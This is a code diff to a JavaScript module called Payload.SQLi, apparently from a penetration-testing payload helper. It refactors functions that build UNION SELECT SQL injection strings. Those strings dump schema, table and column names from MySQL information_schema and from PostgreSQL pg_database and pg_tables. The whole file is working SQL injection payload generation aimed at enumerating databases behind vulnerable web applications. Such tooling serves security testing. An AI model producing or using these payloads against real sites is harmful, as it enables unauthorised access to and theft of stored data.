@@ -22,8 +22,10 @@ Payload.SQLi = {
         return ''
       }
 
-      return 'union select group_concat(schema_name)' + ((value > 1) ? ',' : '') +
-        Array.from(Array(value + 1).keys()).slice(2).join(',') +
+      let columns = Array.from(Array(value + 1).keys()).slice(1)
+      columns[(value === 1) ? 0 : 1] = 'group_concat(schema_name)'
+
+      return 'union select ' + columns.join(',') +
         ' from information_schema.schemata'
     }
 
@@ -33,8 +35,10 @@ Payload.SQLi = {
         return ''
       }
 
-      return 'union select group_concat(table_name)' + ((value > 1) ? ',' : '') +
-        Array.from(Array(value + 1).keys()).slice(2).join(',') +
+      let columns = Array.from(Array(value + 1).keys()).slice(1)
+      columns[(value === 1) ? 0 : 1] = 'group_concat(table_name)'
+
+      return 'union select ' + columns.join(',') +
         ' from information_schema.tables where table_schema=database()'
     }
 
@@ -44,8 +48,10 @@ Payload.SQLi = {
         return ''
       }
 
-      return 'union select group_concat(column_name)' + ((value > 1) ? ',' : '') +
-        Array.from(Array(value + 1).keys()).slice(2).join(',') +
+      let columns = Array.from(Array(value + 1).keys()).slice(1)
+      columns[(value === 1) ? 0 : 1] = 'group_concat(column_name)'
+
+      return 'union select ' + columns.join(',') +
         ' from information_schema.columns where table_schema=database()'
     }
 
@@ -70,8 +76,10 @@ Payload.SQLi = {
         return ''
       }
 
-      return 'union select string_agg(datname, \',\')' + ((value > 1) ? ',' : '') +
-        Array(value - 1).fill('null').join(',') + ' from pg_database'
+      let columns = Array(value).fill('null')
+      columns[(value === 1) ? 0 : 1] = "string_agg(datname, ',')"
+
+      return 'union select ' + columns.join(',') + ' from pg_database'
     }
 
     static dumpTables (value) {
@@ -80,9 +88,11 @@ Payload.SQLi = {
         return ''
       }
 
-      return ' union select string_agg(tablename, \',\')' + ((value > 1) ? ',' : '') +
-        Array(value - 1).fill('null').join(',') +
-        ' from pg_tables where schemaname=\'public\''
+      let columns = Array(value).fill('null')
+      columns[(value === 1) ? 0 : 1] = "string_agg(tablename, ',')"
+
+      return ' union select ' + columns.join(',') +
+        " from pg_tables where schemaname='public'"
     }
 
     static dumpColumns (value) {
@@ -91,9 +101,11 @@ Payload.SQLi = {
         return ''
       }
 
-      return 'union select string_agg(column_name, \',\')' + ((value > 1) ? ',' : '') +
-        Array(value - 1).fill('null').join(',') +
-        ' from information_schema.columns where table_schema=\'public\''
+      let columns = Array(value).fill('null')
+      columns[(value === 1) ? 0 : 1] = "string_agg(column_name, ',')"
+
+      return 'union select ' + columns.join(',') +
+        " from information_schema.columns where table_schema='public'"
     }
   }
 }
